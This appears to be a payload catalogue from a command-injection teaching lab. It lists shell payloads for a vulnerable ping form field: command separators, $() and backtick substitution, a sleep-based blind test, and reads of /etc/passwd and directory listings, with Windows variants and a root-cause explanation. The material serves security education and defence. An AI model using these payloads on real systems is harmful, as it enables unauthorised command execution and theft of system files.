# Payload catalogue

Every payload below goes into the **`host`** field of the web form (or the JSON
body `{"host": "..."}` for curl/scripts). They assume the lab host is
**Linux/macOS** (`/bin/sh`). Windows (`cmd.exe`) equivalents are noted.

All payloads target **only this lab's `POST /ping` endpoint on localhost.**

---

## 1. Command chaining / separators

| Payload (`host` value)            | What the shell does                                   |
|-----------------------------------|-------------------------------------------------------|
| `127.0.0.1; whoami`               | `;` runs `whoami` after ping, unconditionally.        |
| `127.0.0.1 && id`                 | `&&` runs `id` only if ping succeeded.                |
| `127.0.0.1 \| cat /etc/hostname`  | `\|` pipes ping's output into `cat`, running it.      |
| `127.0.0.1 || id`                 | `||` runs `id` only if ping *failed*.                 |

**Explanation:** the server runs `ping -c 1 <host>`. A separator ends the `ping`
command and starts a new one that the shell also executes. **Proof:** `whoami`
/ `id` output (a username / uid) is not something `ping` prints.

**Windows (cmd.exe):** `127.0.0.1 & whoami`, `127.0.0.1 && whoami`, `127.0.0.1 | whoami`.

---

## 2. Command substitution

| Payload (`host` value) | What the shell does                                        |
|------------------------|------------------------------------------------------------|
| `$(whoami)`            | Runs `whoami`, substitutes result as the "hostname".       |
| `` `id` ``             | Backtick form of the same; runs `id`.                      |
| `$(uname -a)`          | Substitutes the kernel/OS string as the hostname.          |

**Explanation:** `$(...)` and backticks tell the shell to run the inner command
first and paste its output into the line. The command's output becomes ping's
argument, so it shows up in ping's "cannot resolve host" error. **Proof:** the
error names a host that is actually your command's output (e.g. the username).

**Windows:** no direct `$( )`; use separators (attack 1) instead.

---

## 3. Blind / time-based

| Payload (`host` value)  | What the shell does                          |
|-------------------------|----------------------------------------------|
| `127.0.0.1; sleep 5`    | Runs `sleep 5` after ping → response stalls. |

**Explanation:** when output is *not* reflected, you prove execution with a side
effect you can measure — time. A baseline request returns fast; the `sleep 5`
request takes ≥ 5 s. **Proof:** the measured delta (≈ 5000 ms).

**Windows:** `127.0.0.1 & ping -n 6 127.0.0.1 >NUL` (crude delay via 5 pings).

---

## 4. Data exfiltration / file read

| Payload (`host` value)        | What the shell does                        |
|-------------------------------|--------------------------------------------|
| `127.0.0.1; cat /etc/passwd`  | Reads and returns a sensitive system file. |
| `127.0.0.1; ls -la /`         | Lists the filesystem root.                 |

**Explanation:** same injection, higher impact — arbitrary file read. In a real
app this is how secrets, keys, config and source code leak. **Proof:**
`/etc/passwd` lines (`root:x:0:0:...`) appear in the response.

**Windows:** `127.0.0.1 & type C:\Windows\win.ini`, `127.0.0.1 & dir C:\`.

---

## The single root cause

Every payload works for **one** reason: the vulnerable server concatenates
untrusted input into a string and hands that string to a **shell**
(`exec` / `{shell:true}`). The shell is an interpreter; `;`, `&&`, `|`, `$()`
and backticks are *its* syntax. Stop spawning a shell with untrusted input and
every payload above becomes an ordinary (invalid) hostname — see `secure/`.
